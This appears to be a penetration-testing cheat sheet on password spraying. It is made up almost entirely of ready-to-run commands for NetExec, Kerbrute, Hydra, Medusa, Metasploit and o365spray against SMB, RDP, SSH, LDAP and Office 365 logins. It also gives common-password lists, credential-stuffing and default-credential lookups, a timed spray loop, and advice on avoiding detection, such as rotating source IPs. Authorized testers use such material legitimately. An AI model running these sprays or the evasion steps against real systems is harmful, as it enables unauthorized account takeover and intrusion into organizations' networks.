# Password Spraying

Attempt a single password against multiple user accounts to avoid account lockouts while testing for weak credentials.
Password spraying is less noisy than brute forcing and respects account lockout policies by trying one password across many users.

## Quick Reference

```bash
# NetExec SMB spray
nxc smb 10.10.10.0/24 -u users.txt -p 'Password123!' --continue-on-success

# Kerbrute spray
kerbrute passwordspray -d domain.local users.txt 'Password123!'

# Hydra SSH spray
hydra -L users.txt -p 'Password123!' ssh://10.10.10.10
```

## NetExec (CrackMapExec) Spraying

```bash
# SMB password spray
nxc smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success

# Domain spray
nxc smb 10.10.10.10 -u users.txt -p 'Password123!' -d domain.local --continue-on-success

# Local authentication
nxc smb 10.10.10.10 -u users.txt -p 'Password123!' --local-auth --continue-on-success

# Subnet spray
nxc smb 10.10.10.0/24 -u administrator -p 'Password123!'

# WinRM spray
nxc winrm 10.10.10.0/24 -u users.txt -p 'Password123!'

# RDP spray
nxc rdp 10.10.10.0/24 -u users.txt -p 'Password123!'

# MSSQL spray
nxc mssql 10.10.10.10 -u users.txt -p 'Password123!'

# LDAP spray
nxc ldap 10.10.10.10 -u users.txt -p 'Password123!'
```

## Kerbrute

```bash
# Password spray
kerbrute passwordspray -d domain.local users.txt 'Password123!'

# With domain controller
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'

# Multiple passwords
for pass in 'Password123!' 'Welcome1!' 'Summer2024!'; do
    kerbrute passwordspray -d domain.local users.txt "$pass"
done
```

## Hydra

```bash
# SSH spray
hydra -L users.txt -p 'Password123!' ssh://10.10.10.10

# RDP spray
hydra -L users.txt -p 'Password123!' rdp://10.10.10.10

# SMB spray
hydra -L users.txt -p 'Password123!' smb://10.10.10.10

# FTP spray
hydra -L users.txt -p 'Password123!' ftp://10.10.10.10

# HTTP POST spray
hydra -L users.txt -p 'Password123!' 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

## Medusa

```bash
# SSH spray
medusa -U users.txt -p 'Password123!' -h 10.10.10.10 -M ssh

# RDP spray
medusa -U users.txt -p 'Password123!' -h 10.10.10.10 -M rdp

# SMB spray
medusa -U users.txt -p 'Password123!' -h 10.10.10.10 -M smbnt
```

## Metasploit

```bash
# SMB spray
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.10.10.0/24
set USER_FILE users.txt
set PASS_FILE passwords.txt
set SMBDomain domain.local
run

# SSH spray
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.10.10.10
set USER_FILE users.txt
set PASSWORD Password123!
run
```

## Office 365 Spraying

```bash
# Validate domain
python3 o365spray.py --validate --domain company.com

# Enumerate users
python3 o365spray.py --enum -U users.txt --domain company.com

# Password spray
python3 o365spray.py --spray -U users.txt -p 'Password123!' --count 1 --lockout 1 --domain company.com

# Multiple passwords with delay
python3 o365spray.py --spray -U users.txt -P passwords.txt --count 1 --lockout 5 --domain company.com
```

## Common Passwords to Try

```bash
# Seasonal passwords
Password123!
Welcome1!
Summer2024!
Winter2024!
Spring2024!
Fall2024!

# Company-based
CompanyName123!
CompanyName2024!

# Simple patterns
P@ssw0rd
P@ssw0rd123
Password1!
Passw0rd!

# Month-based
January2024!
February2024!
March2024!
```

## Credential Stuffing

```bash
# Hydra with user:pass list
hydra -C user_pass.txt ssh://10.10.10.10

# NetExec with user:pass list
nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce

# Format: username:password (one per line)
# admin:Password123!
# user:Welcome1!
```

## Default Credentials

```bash
# Search default credentials database
pip3 install defaultcreds-cheat-sheet
creds search mysql
creds search linksys
creds search cisco

# Common defaults
# admin:admin
# administrator:password
# root:root
# admin:password123
```

## Common Workflow

```bash
# Step 1: Enumerate users
nxc smb 10.10.10.10 -u '' -p '' --users > users.txt

# Step 2: Check password policy
nxc smb 10.10.10.10 -u username -p password --pass-pol

# Step 3: Create password list based on policy
# Minimum 8 characters, 1 uppercase, 1 number, 1 special

# Step 4: Spray with delays
for pass in 'Password123!' 'Welcome1!' 'Summer2024!'; do
    echo "[*] Trying: $pass"
    nxc smb 10.10.10.0/24 -u users.txt -p "$pass" --continue-on-success
    echo "[*] Waiting 30 minutes..."
    sleep 1800
done
```

## Notes

**Password Spraying vs Brute Force:**

- **Password Spraying**: One password, many users
  - Respects lockout policies
  - Less noisy
  - Higher success rate with common passwords

- **Brute Force**: Many passwords, one user
  - Triggers lockout policies
  - Very noisy
  - Higher detection risk

**Account Lockout Considerations:**

Always check lockout policy before spraying:
```bash
nxc smb 10.10.10.10 -u username -p password --pass-pol
```

Typical policies:
- Lockout threshold: 3-5 attempts
- Lockout duration: 30 minutes
- Observation window: 30 minutes

**Spraying Strategy:**

1. Try 1 password per user
2. Wait for lockout window to reset (30+ minutes)
3. Try next password
4. Repeat

**Best Passwords to Try:**

Based on common patterns:
- Season + Year + Symbol: `Summer2024!`
- Company + Year + Symbol: `CompanyName2024!`
- Welcome + Number + Symbol: `Welcome1!`
- Password + Number + Symbol: `Password123!`

**Time-Based Patterns:**

- Current season
- Current year
- Current month
- Upcoming season

**OSINT for Password Generation:**

- Company name
- Industry terms
- Location
- Sports teams
- Common phrases

**Detection Avoidance:**

- Spray during business hours
- Use realistic delays (30-60 minutes)
- Limit attempts per user
- Rotate source IPs if possible
- Use valid user accounts

**Success Indicators:**

NetExec:
- `[+]` = Valid credentials
- `Pwn3d!` = Admin access

Kerbrute:
- `VALID LOGIN` = Success

Hydra:
- `[22][ssh] host: 10.10.10.10 login: admin password: Password123!`

**Post-Spray Actions:**

Once valid credentials found:
1. Verify access level
2. Check for admin rights
3. Enumerate accessible systems
4. Document credentials
5. Continue enumeration

**Tools Comparison:**

- **NetExec**: Best for Windows/AD environments
- **Kerbrute**: Fast Kerberos pre-auth spraying
- **Hydra**: Multi-protocol support
- **O365spray**: Office 365 specific
- **Medusa**: Alternative to Hydra

**Legal and Ethical:**

- Only spray with authorization
- Respect lockout policies
- Document all attempts
- Avoid DoS conditions
- Follow rules of engagement
